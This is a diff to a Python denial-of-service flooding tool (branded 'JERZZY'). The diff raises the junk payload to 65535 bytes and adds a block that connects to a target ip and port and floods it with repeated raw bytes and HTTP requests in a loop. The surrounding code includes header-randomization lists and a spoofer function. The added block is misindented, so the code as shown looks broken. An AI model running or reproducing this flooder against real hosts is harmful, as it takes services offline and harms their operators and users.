@@ -41,7 +41,7 @@ def run():
 			print("[!] JERZZY - ERROR SERVER TIME OUT")
 
 def run2():
-	data = random._urandom(18)
+	data = random._urandom(65535)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -889,7 +889,46 @@ acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;
 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]    
 
-
+try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.connect((ip,port))
+            s.send(data)
+            s.send(data)
+            s.send(data)
+            s.send(data)
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.send(data)
+            s.send(data)
+            s.send(data)
+            s.send(data)
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            for x in range(times):
+                s.send(data)
+                s.send(data)
+                s.send(data)
+                s.send(data)
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.send(data)
+                s.send(data)
+                s.send(data)
+                s.send(data)
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+            print(i +" Sent!!!")
+        except socket.error:
+            s.close()
 
 
 def spoofer():
